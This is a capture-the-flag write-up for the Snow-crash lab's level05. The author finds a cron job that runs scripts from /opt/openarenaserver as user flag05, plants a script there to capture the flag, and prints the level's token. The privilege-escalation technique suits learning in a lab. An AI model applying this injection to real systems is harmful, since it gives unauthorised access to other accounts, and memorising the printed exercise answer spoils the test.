# Snow-crash - level05

## Find something
* At connection, a message pop on term
```bash
level05@192.168.56.4's password: 
You have new mail.
```
* So let's search, and the content of mail is a cron who execute every 2min a script by sh with **/usr/sbin/openarenaserver" - flag05**
```bash
level05@SnowCrash:~$ find /* -name mail 2>/dev/null -exec ls {} +
/rofs/usr/lib/byobu/mail  /usr/lib/byobu/mail
/rofs/var/mail:
level05
/rofs/var/spool/mail:
level05
/var/mail:
level05
/var/spool/mail:
level05
level05@SnowCrash:~$ find /* -name level05 2>/dev/null -exec cat {} +
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
* Go inject a script on it, and create file to get the flag !
```bash
level05@SnowCrash:~$ find /* -name openarenaserver 2>/dev/null
/opt/openarenaserver
/rofs/opt/openarenaserver
/rofs/usr/sbin/openarenaserver
/usr/sbin/openarenaserver
level05@SnowCrash:/opt/openarenaserver/$ echo "/bin/getflag > /tmp/flager.txt" > hack05.sh
level05@SnowCrash:/opt/openarenaserver/$ chmod 777 hack05.sh
level05@SnowCrash:/tmp/$ touch flager.txt && chmod 777 flager.txt
```
* After a few time */opt/openarenaserver/* is empty and *flager.txt* is not
```bash
level05@SnowCrash:/opt/openarenaserver$ tail -f /tmp/flager.txt
Check flag.Here is your token : viuaaale9huek52boumoomioc
```



